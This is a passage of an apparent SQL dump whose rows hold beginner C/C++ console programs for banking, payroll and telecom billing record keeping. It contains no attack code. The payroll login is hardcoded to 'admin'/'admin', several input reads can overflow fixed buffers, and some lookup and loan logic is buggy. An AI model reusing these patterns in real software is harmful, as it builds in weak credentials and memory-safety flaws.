free(dummy);\r\n			printf(\"has been deleted \");\r\n			getch();\r\n			Sleep(800);\r\n			return;\r\n		}\r\n		stream = stream->following;\r\n	}\r\n	printf(\"passport number is wrong please check your passport\");\r\n\r\n}\r\n', '2024-07-09 22:04:56', '2024-07-09 22:04:56'),
(12, 13, 'banking management system.cpp', '#include<iostream>\r\n#include<vector>\r\nusing namespace std;\r\n\r\nclass BankAccount{\r\n	private:\r\n		string name;\r\n		int accountNum;\r\n		double balance;\r\n	public:\r\n		BankAccount(string n, int ac,double bal){\r\n			name = n;\r\n			accountNum = ac;\r\n			balance = bal;\r\n		}\r\n		string getName(){\r\n			return name;\r\n		}\r\n		int getAccountNum(){\r\n			return accountNum;\r\n			}\r\n		double getBalance(){\r\n			return balance;\r\n		}\r\n		void deposit(double amount){\r\n			balance = balance + amount;\r\n		}\r\n		void withdraw(double amount){\r\n			if(balance >= amount){\r\n				balance = balance - amount;\r\n				cout<<\"\\t\\tWithdraw Successfully...\"<<endl;\r\n			}else{\r\n				cout<<\"\\t\\tInsufficient Balance....\"<<endl;\r\n			}\r\n		}\r\n};\r\nclass BankManagement{\r\n	private:\r\n		vector<BankAccount> accounts;\r\n	public:\r\n		void AddAccount(string name,int accountNum,double balance){\r\n			accounts.push_back(BankAccount(name,accountNum,balance));\r\n		}\r\n		void showAllAccounts(){\r\n			cout<<\"\\t\\tAll Account Holders \"<<endl;\r\n			for(int i = 0; i<accounts.size();i++){\r\n				cout<<\"\\t\\tName :\"<<accounts[i].getName()<<\" Account Number :\"<<accounts[i].getAccountNum()<<\" Balance :\"<<accounts[i].getBalance()<<endl;\r\n			}\r\n		}\r\n		void searchAccount(int account){\r\n			cout<<\"\\t\\tAccount Holder \"<<endl;\r\n			for(int i = 0; i<accounts.size();i++){\r\n				if(accounts[i].getAccountNum()==account){\r\n				cout<<\"\\t\\tName :\"<<accounts[i].getName()<<\" Account Number :\"<<accounts[i].getAccountNum()<<\" Balance :\"<<accounts[i].getBalance()<<endl;\r\n				}\r\n			}\r\n		}\r\n		BankAccount* findAccount(int accountNum){\r\n			for(int i = 0; i<accounts.size();i++){\r\n				if(accounts[i].getAccountNum()==accountNum){\r\n					return &accounts[i];\r\n				}\r\n			}\r\n		}\r\n};\r\nmain(){\r\n\r\n	BankManagement bank;\r\n	int choice;\r\n	char op;\r\n	do{\r\n		system(\"cls\");\r\n		cout<<\"\\t\\t======== Banking Management System ========\\n\"<<endl;\r\n		cout<<\"\\t\\t\\tMain Menu\"<<endl;\r\n		cout<<\"\\t\\t1. Create New Account\"<<endl;\r\n		cout<<\"\\t\\t2. Show All Account\"<<endl;\r\n		cout<<\"\\t\\t3. Search Account\"<<endl;\r\n		cout<<\"\\t\\t4. Deposit Money\"<<endl;\r\n		cout<<\"\\t\\t5. Withdraw Money\"<<endl;\r\n		cout<<\"\\t\\t6. Exit\"<<endl;\r\n		cout<<\"\\t\\t-------------------------------\"<<endl;\r\n		cout<<\"\\t\\tEnter Your Choice :\";\r\n		cin>>choice;\r\n		switch(choice){\r\n			case 1:{\r\n				string name;\r\n				int accountNum;\r\n				double balance;\r\n				cout<<\"\\t\\tEnter Name :\";\r\n				cin>>name;\r\n				cout<<\"\\t\\tEnter Account Number :\";\r\n				cin>>accountNum;\r\n				cout<<\"\\t\\tEnter Initial Balance :\";\r\n				cin>>balance;\r\n				bank.AddAccount(name,accountNum,balance);\r\n				cout<<\"\\t\\tAccount Created Successfully....\"<<endl;\r\n				break;\r\n			}\r\n			case 2:{\r\n				bank.showAllAccounts();\r\n				break;\r\n			}\r\n			case 3:{\r\n				int accountNum;\r\n				cout<<\"\\t\\tEnter Account Number :\";\r\n				cin>>accountNum;\r\n				bank.searchAccount(accountNum);\r\n				break;\r\n			}\r\n			case 4:{\r\n				int accountNum;\r\n				double amount;\r\n				cout<<\"\\t\\tEnter Account Number to Deposit Money :\";\r\n				cin>>accountNum;\r\n				BankAccount* account = bank.findAccount(accountNum);\r\n				if(account !=NULL){\r\n					cout<<\"\\t\\tEnter Amount to Deposit :\";\r\n					cin>>amount;\r\n					account->deposit(amount);\r\n					cout<<\"\\t\\t\"<<amount<<\" Deposit Successfully ....\"<<endl;\r\n				}else{\r\n					cout<<\"\\t\\tAcount Not Found ...\"<<endl;\r\n				}\r\n				break;\r\n			}\r\n			case 5:{\r\n				int accountNum;\r\n				double amount;\r\n				cout<<\"\\t\\tEnter Account Number to Withdraw Money :\";\r\n				cin>>accountNum;\r\n				BankAccount* account = bank.findAccount(accountNum);\r\n				if(account !=NULL){\r\n					cout<<\"\\t\\tEnter Amount to withdraw :\";\r\n					cin>>amount;\r\n					account->withdraw(amount);\r\n\r\n				}else{\r\n					cout<<\"\\t\\tAcount Not Found ...\"<<endl;\r\n				}\r\n				break;\r\n			}\r\n			case 6:{\r\n				exit(1);\r\n				break;\r\n			}\r\n	}\r\n	cout<<\"\\t\\tDo You Want to Countinue or Exit [Y/N]: \";\r\n	cin>>op;\r\n\r\n	}while(op == \'y\'||op ==\'Y\');\r\n\r\n}\r\n', '2024-07-10 04:09:28', '2024-07-10 04:09:28'),
(13, 13, 'Payroll Management System.cpp', '#include<stdio.h>\r\n#include<iostream>\r\n#include<stdlib.h>\r\n#include<string.h>\r\n#include<conio.h>\r\n#include<windows.h>\r\n#include<time.h>\r\n#include<iomanip>\r\n#include<ctype.h>\r\n#define max 50\r\nusing namespace std;\r\n\r\nint num=0;\r\nvoid gotoXY(int,int);\r\nvoid Cdelay(int);\r\nvoid border(int, int,int, int);\r\nvoid borderNoDelay(int, int,int, int);\r\nvoid loginFrame(int, int, int, int);\r\nvoid intro();\r\nvoid login();\r\nvoid menu();\r\nvoid insert();\r\nvoid edit();\r\nvoid editmenu();\r\nvoid editname(int);\r\nvoid editcode(int);\r\nvoid editdes(int);\r\nvoid editexp(int);\r\nvoid editage(int);\r\nvoid editsalary(int);\r\nvoid list();\r\nvoid deletes();\r\nvoid search();\r\nvoid setWindowSize(int,int);\r\nvoid saverecords();\r\nvoid getrecords();\r\nbool isFilePresent();\r\nvoid displayPayslip();\r\n\r\n\r\nclass employee\r\n{\r\npublic:\r\n    char name[20];\r\n    int code;\r\n    char designation[20];\r\n    int exp;\r\n    int age;\r\n    int salary;\r\n    char AnyLoan;\r\n\r\n    int HRA;\r\n    int PF;\r\n    int tax;\r\n    int MealAllowance;\r\n    int TransportAllowance;\r\n    int MedicalAllowance;\r\n    int LoanBalance;\r\n    int LoanDebit;\r\n    int grosspay;\r\n    int workingHours;\r\n    int DA;\r\n\r\n};\r\nemployee emp[max],tempemp[max];\r\n\r\n\r\nvoid getrecords()\r\n{\r\n    FILE *fp;\r\n    fp = fopen(\"Records.txt\",\"r\");\r\n    int c=0;\r\n    if(fp!=NULL)\r\n    {\r\n        while(feof(fp)==0)\r\n        {\r\n            fscanf(fp,\"%s\\t%d\\t%s\\t%d\\t%d\\t%d\\t%c\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\n\",&emp[c].name,&emp[c].code,&emp[c].designation,&emp[c].exp,&emp[c].age,&emp[c].salary,&emp[c].AnyLoan,&emp[c].HRA,&emp[c].PF,&emp[c].tax,&emp[c].MealAllowance,&emp[c].TransportAllowance,&emp[c].MedicalAllowance,&emp[c].LoanBalance,&emp[c].LoanDebit,&emp[c].grosspay,&emp[c].workingHours,&emp[c].DA);\r\n            c++;\r\n        }\r\n        num=c;\r\n    }\r\n    fclose(fp);\r\n}\r\n\r\nvoid saverecords()\r\n{\r\n    if(num==0)\r\n    {\r\n        system(\"del Records.txt\");\r\n    }\r\n    else\r\n    {\r\n        FILE *fp;\r\n        fp = fopen(\"Records.txt\",\"w\");\r\n        for(int i=0;i<num;i++)\r\n        {\r\n            fprintf(fp,\"%s\\t%d\\t%s\\t%d\\t%d\\t%d\\t%c\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\t%d\\n\",emp[i].name,emp[i].code,emp[i].designation,emp[i].exp,emp[i].age,emp[i].salary,emp[i].AnyLoan,emp[i].HRA,emp[i].PF,emp[i].tax,emp[i].MealAllowance,emp[i].TransportAllowance,emp[i].MedicalAllowance,emp[i].LoanBalance,emp[i].LoanDebit,emp[i].grosspay,emp[i].workingHours,emp[i].DA);\r\n        }\r\n        fclose(fp);\r\n    }\r\n}\r\n\r\nvoid Cdelay(int msec)\r\n{\r\n    long goal = msec + (clock());\r\n    while (goal > (clock()));\r\n}\r\n\r\nbool isFilePresent()\r\n{\r\n    FILE *fp;\r\n    fp = fopen(\"Records.txt\",\"r\");\r\n    if(fp==NULL)\r\n        return false;\r\n    else\r\n        return true;\r\n}\r\nvoid loginFrame1(int xLenS = 18, int yLenS = 8, int xLenE = 55, int yLenE = 15)\r\n{\r\n    system(\"cls\");\r\n    gotoXY(xLenS,yLenS);printf(\"%c\",201);\r\n\r\n    gotoXY(xLenS,yLenE);printf(\"%c\",200);\r\n\r\n    for(int i=xLenS+1;i<=xLenE-1;i++)         //Top and Bottom Border line\r\n    {\r\n        //Cdelay(0);\r\n        gotoXY(i,yLenS);\r\n        printf(\"%c\",205);\r\n        //puts(style);\r\n        gotoXY(i,yLenE);\r\n        //puts(style);\r\n        printf(\"%c\",205);\r\n\r\n    }\r\n    gotoXY(xLenE,yLenS);printf(\"%c\",187);\r\n    gotoXY(xLenE,yLenE);printf(\"%c\",188);\r\n    for(int i=yLenS+1;i<=yLenE-1;i++)         //Left and Right Border Line\r\n    {\r\n        //Cdelay(20);\r\n        gotoXY(xLenS, i);\r\n        printf(\"%c\",186);\r\n        //puts(style);\r\n        gotoXY(xLenE, i);\r\n        printf(\"%c\",186);\r\n        //puts(style);\r\n    }\r\n    printf(\"\\n\\n\");\r\n}\r\nvoid login()\r\n{\r\n\r\n    char UserName[30],Password[30],ch;int i=0;\r\n    gotoXY(20,10);\r\n    printf(\"Enter UserName : \");\r\n\r\n    cin>>UserName;\r\n    gotoXY(20,12);\r\n    cout<<\"Enter Password : \";\r\n    while(1)\r\n    {\r\n        ch = getch();\r\n        if(ch==13)\r\n            break;\r\n        if(ch==32||ch==9)\r\n            continue;\r\n        else\r\n        {\r\n            cout<<\"*\";\r\n            Password[i]=ch;\r\n            i++;\r\n        }\r\n    }\r\n    Password[i] = \'\\0\';\r\n    if(strcmp(UserName,\"admin\")==0 && strcmp(Password,\"admin\")==0)\r\n    {\r\n        system(\"cls\");\r\n        loginFrame1();\r\n        gotoXY(27,10);\r\n        cout<<\"Login Success!!!\";\r\n        gotoXY(21,12);\r\n        cout<<\"Will be redirected in 3 Seconds...\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n        gotoXY(44,12);\r\n        cout<<\"\\b \\b2\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n        gotoXY(44,12);\r\n        cout<<\"\\b \\b1\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n    }\r\n    else\r\n    {\r\n        system(\"cls\");\r\n        loginFrame1();\r\n        gotoXY(27,10);\r\n        printf(\"Access Denied!!!\\a\");\r\n        gotoXY(21,12);\r\n        cout<<\"Will be redirected in 3 Seconds...\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n        gotoXY(44,12);\r\n        cout<<\"\\b \\b2\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n        gotoXY(44,12);\r\n        cout<<\"\\b \\b1\";\r\n            gotoXY(56,12);\r\n        Cdelay(1000);\r\n        system(\"cls\");\r\n        loginFrame1();\r\n        login();\r\n    }\r\n}\r\nvoid setWindowSize(int width=670,int height=445)\r\n{\r\n    HWND console = GetConsoleWindow();\r\n    RECT r;\r\n    GetWindowRect(console, &r);\r\n    MoveWindow(console, r.left, r.top, width, height, TRUE);\r\n}\r\nvoid gotoXY(int X, int Y)\r\n{\r\n    COORD coordinates;\r\n    coordinates.X = X;\r\n    coordinates.Y = Y;\r\n    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coordinates);\r\n}\r\n\r\nvoid borderNoDelay(int xLenS = 2, int yLenS = 2,int xLenE = 76, int yLenE = 24 )\r\n{\r\n    system(\"cls\");\r\n    gotoXY(xLenS,yLenS);printf(\"%c\",201);\r\n\r\n    gotoXY(xLenS,yLenE);printf(\"%c\",200);\r\n\r\n    for(int i=xLenS+1;i<=xLenE-1;i++)         //Top and Bottom Border line\r\n    {\r\n        gotoXY(i,yLenS);\r\n        printf(\"%c\",205);\r\n        gotoXY(i,yLenE);\r\n        printf(\"%c\",205);\r\n    }\r\n    gotoXY(xLenE,yLenS);printf(\"%c\",187);\r\n    gotoXY(xLenE,yLenE);printf(\"%c\",188);\r\n    for(int i=yLenS+1;i<=yLenE-1;i++)         //Left and Right Border Line\r\n    {\r\n        gotoXY(xLenS, i);\r\n        printf(\"%c\",186);\r\n        gotoXY(xLenE, i);\r\n        printf(\"%c\",186);\r\n    }\r\n    printf(\"\\n\\n\");\r\n}\r\nvoid border(int xLenS = 2, int yLenS = 2,int xLenE = 76, int yLenE = 22 )\r\n{\r\n    system(\"cls\");\r\n    gotoXY(xLenS,yLenS);printf(\"%c\",201);\r\n\r\n    gotoXY(xLenS,yLenE);printf(\"%c\",200);\r\n\r\n    for(int i=xLenS+1;i<=xLenE-1;i++)         //Top and Bottom Border line\r\n    {\r\n        Cdelay(15);\r\n        gotoXY(i,yLenS);\r\n        printf(\"%c\",205);\r\n        //puts(style);\r\n        gotoXY(i,yLenE);\r\n        //puts(style);\r\n        printf(\"%c\",205);\r\n\r\n    }\r\n    gotoXY(xLenE,yLenS);printf(\"%c\",187);\r\n    gotoXY(xLenE,yLenE);printf(\"%c\",188);\r\n    for(int i=yLenS+1;i<=yLenE-1;i++)         //Left and Right Border Line\r\n    {\r\n        Cdelay(15);\r\n        gotoXY(xLenS, i);\r\n        printf(\"%c\",186);\r\n        //puts(style);\r\n        gotoXY(xLenE, i);\r\n        printf(\"%c\",186);\r\n        //puts(style);\r\n    }\r\n    printf(\"\\n\\n\");\r\n}\r\nvoid loginFrame(int xLenS = 18, int yLenS = 8, int xLenE = 55, int yLenE = 15){\r\n    border(xLenS,yLenS,xLenE,yLenE);\r\n}\r\nvoid insert(){\r\n    borderNoDelay();\r\n    int i=num;\r\n    int sal,PF,TAX,HRA,MealA,MedicalA,TransportA,LoanBal,LoanDeb,h,DA;\r\n    char loan;\r\n    num+=1;\r\n    gotoXY(28,4);\r\n    printf(\"Insert New Record\");\r\n    gotoXY(10,6);\r\n    cout<<\"Name : \";\r\n    //cin.getline(emp[i].name,sizeof(emp[i].name));\r\n    cin>>emp[i].name;\r\n    gotoXY(10,8);\r\n    cout<<\"Code : \";\r\n    cin>>emp[i].code;\r\n    gotoXY(10,10);\r\n    cout<<\"Designation : \";\r\n    cin>>emp[i].designation;\r\n    gotoXY(10,12);\r\n    cout<<\"Years of Experience : \";\r\n    cin>>emp[i].exp;\r\n    gotoXY(10,14);\r\n    cout<<\"Age : \";\r\n    cin>>emp[i].age;\r\n    gotoXY(10,16);\r\n    cout<<\"Enter Working Hours : \";\r\n    cin>>h;\r\n    sal = h*300;\r\n    emp[i].workingHours = h;\r\n    do{\r\n        gotoXY(10,18);\r\n        cout<<\"Any Loan (Y/N) ?: \\b \\b\";\r\n        loan=getche();\r\n        if(loan==\'Y\'|| loan == \'y\' || loan ==\'n\' || loan == \'N\')\r\n            break;\r\n    }while(1);\r\n    if(loan==\'y\'|| loan==\'Y\'){\r\n    gotoXY(10,20);\r\n    cout<<\"Enter Loan Balance : \";\r\n    cin>>LoanBal;\r\n    }else{\r\n        LoanBal=0;\r\n    }\r\n    gotoXY(14,22);\r\n    cout<<\"Recorded Succesfully...!!!\";\r\n\r\n    TAX =  0.04 * sal;\r\n    DA = 1.20 * sal;\r\n    PF = 0.12 * sal;\r\n    HRA = sal * 0.27;\r\n    MealA = 300;\r\n    MedicalA = 300;\r\n    TransportA = 300;\r\n    LoanDeb = sal * 0.09;\r\n    if(LoanDeb > LoanBal)\r\n    {\r\n        LoanBal = 0;\r\n        LoanDeb = LoanBal;\r\n    }\r\n    emp[i].salary = sal;\r\n    emp[i].DA = DA;\r\n    emp[i].tax=TAX;\r\n    emp[i].PF = PF;\r\n    emp[i].HRA = HRA;\r\n    emp[i].MealAllowance = MealA;\r\n    emp[i].MedicalAllowance = MedicalA;\r\n    emp[i].TransportAllowance = TransportA;\r\n    emp[i].LoanBalance = LoanBal-LoanDeb;\r\n    emp[i].AnyLoan = loan;\r\n    emp[i].LoanDebit = LoanDeb;\r\n    emp[i].grosspay = (sal+MealA+MedicalA+TransportA+HRA+DA)-(PF+TAX+LoanDeb) ;\r\n    getch();\r\n}\r\n\r\nvoid intro()\r\n{\r\n    gotoXY(27,4); printf(\"PAYROLL MANAGEMENT SYSTEM\");\r\n    gotoXY(20,8); printf(\"\");\r\n    gotoXY(20,11); printf(\"\");\r\n    gotoXY(20,13); printf(\"\");\r\n    gotoXY(20,15); printf(\"\");\r\n    gotoXY(24,20);printf(\"Press Any key to continue...\");\r\n    getch();\r\n\r\n}\r\n\r\nvoid  list(){\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    gotoXY(20,4);\r\n    printf(\"       ******** List of the Employees ********\");\r\n    gotoXY(6,6);\r\n    cout<<\"Name\\tCode\\tDesignation\\tYears(EXP)\\tAge\\tSalary \"<<endl;\r\n    gotoXY(6,7);\r\n    cout<<\"------------------------------------------------------------------\"<<endl;\r\n    for(int i=0,j=8;i<=num-1;i++,j++)\r\n    {\r\n        gotoXY(6,j);\r\n        cout<<emp[i].name;\r\n        gotoXY(19,j);\r\n        cout<<emp[i].code;\r\n        gotoXY(26,j);\r\n        cout<<emp[i].designation;\r\n        gotoXY(47,j);\r\n        cout<<emp[i].exp;\r\n        gotoXY(58,j);\r\n        cout<<emp[i].age;\r\n        gotoXY(66,j);\r\n        cout<<emp[i].grosspay;\r\n    }\r\n    getch();\r\n}\r\n\r\nvoid loading(){\r\n    system(\"cls\");\r\n    gotoXY(55,20);\r\n    printf(\"Loading...\");\r\n    gotoXY(50,22);\r\n    for(int i = 0; i<20; i++){\r\n        Cdelay(200);\r\n        printf(\"%c\",254);\r\n    }\r\n}\r\nvoid menu(){\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    //gotoXY(0,0);\r\n    //cout<<\"Number of Records Avaliable : \"<<num;\r\n    gotoXY(16,4);\r\n    printf(\"*****  Payroll Management System 1.0 ***** \");\r\n    gotoXY(12,6);\r\n    cout<<\"Press  a ----> Add New Record.\";\r\n    gotoXY(12,8);\r\n    cout<<\"Press  u ----> Update a Record.\";\r\n    gotoXY(12,10);\r\n    cout<<\"Press  d ----> Delete a Record.\";\r\n    gotoXY(12,12);\r\n    cout<<\"Press  s ----> Search a Record.\";\r\n    gotoXY(12,14);\r\n    cout<<\"Press  l ----> List The Employee Table.\";\r\n    gotoXY(12,16);\r\n    cout<<\"Press  p ----> Print Employee PaySlip.\";\r\n    gotoXY(12,18);\r\n    cout<<\"Press  q ----> Quit Program.\";\r\n    gotoXY(16,22);\r\n    cout<<\"Select Your Option ====> \";\r\n}\r\n\r\nvoid deletes(){\r\n    for(int i=0;i<num;i++){\r\n        tempemp[i]=emp[i];\r\n    }\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    int code;\r\n    int check=-1;\r\n    gotoXY(28,4);\r\n    printf(\"Delete a Record\");\r\n    gotoXY(10,6);\r\n    cout<<\"Enter the JobCode To Delete That Record  :\";\r\n    cin>>code;\r\n    int i,j;\r\n    for(i=0;i<=num-1;i++){\r\n        if(emp[i].code==code){\r\n            check=i;\r\n        }\r\n    }\r\n    if(check!=-1){\r\n        for(i=0,j=0;i<=num-1;i++,j++){\r\n            if(i==check){\r\n                i++;\r\n            }\r\n            emp[j]=tempemp[i];\r\n        }\r\n        num--;\r\n    }\r\n}\r\n\r\nvoid search(){\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    int jobcode;\r\n    bool found = false;\r\n    gotoXY(10,4);\r\n    cout<<\"You can Search only through the Jobcode of an Employee\";\r\n    gotoXY(10,6);\r\n    cout<<\"Enter Code Of the Employee : \";\r\n    cin>>jobcode;\r\n    for(int i=0;i<=num-1;i++){\r\n        if(emp[i].code==jobcode){\r\n            gotoXY(6,8);\r\n            cout<<\"Name\\tCode\\tDesignation\\tYears(EXP)\\tAge\\tSalary \"<<endl;\r\n            gotoXY(6,9);\r\n            cout<<\"------------------------------------------------------------------\"<<endl;\r\n            gotoXY(6,11);\r\n            cout<<emp[i].name;\r\n            gotoXY(19,11);\r\n            cout<<emp[i].code;\r\n            gotoXY(26,11);\r\n            cout<<emp[i].designation;\r\n            gotoXY(47,11);\r\n            cout<<emp[i].exp;\r\n            gotoXY(58,11);\r\n            cout<<emp[i].age;\r\n            gotoXY(66,11);\r\n            cout<<emp[i].grosspay;\r\n            found = true;\r\n        }\r\n        //else\r\n        //\r\n    }\r\n    if(!found){\r\n        gotoXY(26,11);\r\n        cout<<\"No records Found...!!!\\a\";\r\n    }\r\n    getch();\r\n}\r\n\r\n\r\n\r\nvoid editmenu(){\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    gotoXY(28,4);\r\n    printf(\"Edit An Entry\");\r\n    gotoXY(10,6);\r\n    cout<<\"What Do You Want To edit\";\r\n    gotoXY(12,8);\r\n    cout<<\"n ---------> Name \";\r\n    gotoXY(12,9);\r\n    cout<<\"c ---------> Code \";\r\n    gotoXY(12,10);\r\n    cout<<\"d ---------> Designation\";\r\n    gotoXY(12,11);\r\n    cout<<\"e ---------> Experience \";\r\n    gotoXY(12,12);\r\n    cout<<\"a ---------> Age\";\r\n    gotoXY(12,13);\r\n    cout<<\"s ---------> Salary\";\r\n    gotoXY(12,14);\r\n    cout<<\"q ---------> QUIT\";\r\n    gotoXY(10,16);\r\n    cout<<\"Enter Choice ---->>>  \";\r\n}\r\n\r\nvoid editname(int i){\r\n    gotoXY(10,18);\r\n    cout<<\"Enter New Name----->  \";\r\n    cin>>emp[i].name;\r\n}\r\n\r\nvoid editcode(int i){\r\n    gotoXY(10,18);\r\n    cout<<\"Enter New Job Code----->  \";\r\n    cin>>emp[i].code;\r\n}\r\n\r\nvoid editdes(int i){\r\n    gotoXY(10,18);\r\n    cout<<\"enter new designation----->  \";\r\n    cin>>emp[i].designation;\r\n}\r\n\r\nvoid editexp(int i){\r\n    gotoXY(10,18);\r\n    cout<<\"Enter new Years of Experience\";\r\n    cin>>emp[i].exp;\r\n}\r\nvoid editage(int i){\r\n    gotoXY(10,18);\r\n    cout<<\"Enter new Age \";\r\n    cin>>emp[i].age;\r\n}\r\n\r\nvoid editsalary(int i){\r\n    int sal,PF,TAX,HRA,MealA,MedicalA,TransportA,LoanBal=emp[i].LoanBalance,LoanDeb,DA;\r\n    char loan;\r\n    gotoXY(10,18);\r\n    cout<<\"Enter new Salary \";\r\n    cin>>sal;\r\n    DA = 1.20 * sal;\r\n    TAX =  0.04 * sal;\r\n    PF = 0.12 * sal;\r\n    HRA = 4000;\r\n    MealA = 300;\r\n    MedicalA = 300;\r\n    TransportA = 300;\r\n    LoanDeb = sal * 0.09;\r\n    if(LoanDeb > LoanBal){\r\n        LoanBal = 0;\r\n        LoanDeb = LoanBal;\r\n    }\r\n    emp[i].salary = sal;\r\n    emp[i].tax=TAX;\r\n    emp[i].PF = PF;\r\n    emp[i].HRA = HRA;\r\n    emp[i].MealAllowance = MealA;\r\n    emp[i].MedicalAllowance = MedicalA;\r\n    emp[i].TransportAllowance = TransportA;\r\n    emp[i].LoanBalance = LoanBal;\r\n    emp[i].AnyLoan = loan;\r\n    emp[i].LoanDebit = LoanDeb;\r\n    emp[i].grosspay = (sal+MealA+MedicalA+TransportA+HRA+DA)-(PF+TAX+LoanDeb) ;\r\n}\r\n\r\nvoid edit(){\r\n    //system(\"cls\");\r\n    borderNoDelay();\r\n    int jobcode;\r\n    gotoXY(28,4);\r\n    printf(\"Edit a Record\");\r\n    int i;\r\n    char option;\r\n    gotoXY(10,6);\r\n    cout<<\"Enter the jobcode To Edit : \";\r\n    cin>>jobcode;\r\n    editmenu();\r\n    for(i=0;i<=num-1;i++){\r\n        if(emp[i].code==jobcode){\r\n            while((option=cin.get())!=\'q\') {\r\n                switch(option){\r\n                    case \'n\':\r\n                        editname(i);\r\n                        break;\r\n                    case \'c\':\r\n                        editcode(i);\r\n                        break;\r\n                    case \'d\':\r\n                        editdes(i);\r\n                        break;\r\n                    case \'e\':\r\n                        editexp(i);\r\n                        break;\r\n                    case \'a\':\r\n                        editage(i);\r\n                        break;\r\n                    case \'s\':\r\n                        editsalary(i);\r\n                        break;\r\n                }\r\n                   editmenu();\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n\r\nvoid displayPayslip(){\r\n    system(\"cls\");\r\n    borderNoDelay();\r\n    gotoXY(10,4);\r\n    int code,i;\r\n    cout<<\"Enter Employee Job Code :\";\r\n    cin>>code;\r\n    for(i=0;i<=num-1;i++){\r\n        if(emp[i].code==code){\r\n            gotoXY(12,6);\r\n            cout<<\"Name : \"<<emp[i].name;\r\n            gotoXY(45,6);\r\n            cout<<\"Working Hours : \"<<emp[i].workingHours<<\" Hrs\";\r\n            gotoXY(6,8);\r\n            cout<<\"Earnings :-\";\r\n            gotoXY(8,10);\r\n            cout<<\"Basic Pay : \"<<emp[i].salary<<endl;\r\n            gotoXY(8,12);\r\n            cout<<\"HRA(27% of Basic): \"<<emp[i].HRA<<endl;\r\n            gotoXY(8,14);\r\n            cout<<\"DA (120% of Basic):\"<<emp[i].DA;\r\n            gotoXY(8,16);\r\n            cout<<\"Meal Allowance : \"<<emp[i].MealAllowance<<endl;\r\n            gotoXY(8,18);\r\n            cout<<\"Medical Alowance : \"<<emp[i].MedicalAllowance<<endl;\r\n            gotoXY(8,20);\r\n            cout<<\"Transport Allowance : \"<<emp[i].TransportAllowance<<endl;\r\n            gotoXY(40,8);\r\n            cout<<\"Deductions :- \"<<endl<<endl;\r\n            gotoXY(42,10);\r\n            cout<<\"PF : \"<<emp[i].PF<<endl;\r\n            gotoXY(42,12);\r\n            cout<<\"Tax : \"<<emp[i].tax<<endl;\r\n            gotoXY(42,14);\r\n            int l = emp[i].AnyLoan;\r\n            char l2 = toupper(l);\r\n            cout<<\"Loan Status : \"<<l2<<endl;\r\n            gotoXY(42,16);\r\n            cout<<\"Loan Debit This Month : \"<<emp[i].LoanDebit<<endl;\r\n            gotoXY(42,18);\r\n            cout<<\"Loan Balance : \"<<emp[i].LoanBalance<<endl;\r\n            gotoXY(32,22);\r\n            cout<<\"Total Gross Pay : \"<<emp[i].grosspay;\r\n        }\r\n    }\r\n    getch();\r\n}\r\nint main(){\r\n    setWindowSize();\r\n    border();\r\n    intro();\r\n    loading();\r\n    loginFrame();\r\n    login();\r\n    menu();\r\n    getrecords();\r\n    char option;\r\n    if(emp[0].code==0 && isFilePresent())\r\n        num--;\r\n\r\n    while(1){\r\n        option=getch();\r\n        switch(option){\r\n            case \'l\':\r\n                list();\r\n                break;\r\n            case \'a\':\r\n                insert();\r\n                break;\r\n            case \'d\':\r\n                deletes();\r\n                break;\r\n            case \'u\':\r\n                edit();\r\n                break;\r\n            case \'s\':\r\n                search();\r\n                break;\r\n            case \'p\':\r\n                displayPayslip();\r\n                break;\r\n            case \'q\':\r\n                saverecords();\r\n                exit(0);\r\n        }\r\n        menu();\r\n    }\r\n    return 0;\r\n}', '2024-07-10 04:12:01', '2024-07-10 04:12:01'),
(14, 13, 'Telecom Billing Management System.cpp', '#include<stdio.h>\r\n#include<conio.h>\r\n#include<windows.h>\r\n#include<stdlib.h>\r\n\r\nstruct subscriber{\r\n	char phonenumber[20];\r\n	char name[50];\r\n	float amount;\r\n}s;\r\nvoid gotoxy(int,int);\r\nvoid addrecords();\r\nvoid listrecords();\r\nvoid modifyrecords();\r\nvoid deleterecords();\r\nvoid searchrecords();\r\nvoid payment();\r\nvoid login();\r\nchar get;\r\nint main()\r\n{	int password;\r\n	int phonenumber;\r\n	char choice;\r\n\r\n    system(\"cls\");\r\n    gotoxy(10,2);\r\n	system(\"cls\");\r\n\r\ngotoxy(0,2);\r\n	printf(\"\\t********************************************************\");\r\n	printf(\"\\n\\t     ------ TELECOM BILLING MANAGEMENT SYSTEM ------\");\r\n	printf(\"\\n\\t********************************************************\");\r\n	printf(\"\\n\\n\\n\\t\\t Press Any Key To Continue. . \");\r\n	Sleep(0);\r\n	getch();\r\n	system(\"cls\");\r\n	login();\r\n\r\n	system(\"cls\");\r\n 	gotoxy(30,0);\r\n\r\n\r\n	while (1){\r\n            printf(\"\\n\\n\\xDB\\xDB\\xDB\\xDB\\xDB  TELECOM BILLING SYSTEM  \\xDB\\xDB\\xDB\\xDB\\xDB\");\r\n	      printf(\" \\n\\n \\xDB\\xDB 1 : Add New Record.\\n\\n \\xDB\\xDB 2 : List Of Record\");\r\n	     printf(\"\\n\\n \\xDB\\xDB 3 : Modify Record.\\n\\n \\xDB\\xDB 4 : Payment Transaction\");\r\n		printf(\"\\n\\n \\xDB\\xDB 5 : Search Record.\");\r\n		printf(\"\\n\\n \\xDB\\xDB 6 : Delete Record.\\n\\n \\xDB\\xDB 7 : Exit\\n\");\r\n	     printf(\"\\n Enter Your Choice:-\");\r\n		 choice=getche();\r\n		choice=toupper(choice);\r\n		switch(choice)\r\n		{\r\n			case \'1\':\r\n			        addrecords();break;\r\n			case \'2\':\r\n			listrecords();break;\r\n			case \'3\':\r\n			modifyrecords();break;\r\n			case \'4\':\r\n		    payment()	;break;\r\n			case \'5\':\r\n		     searchrecords()	;break;\r\n			case \'6\':\r\n				deleterecords();break;\r\n			case \'7\':\r\n				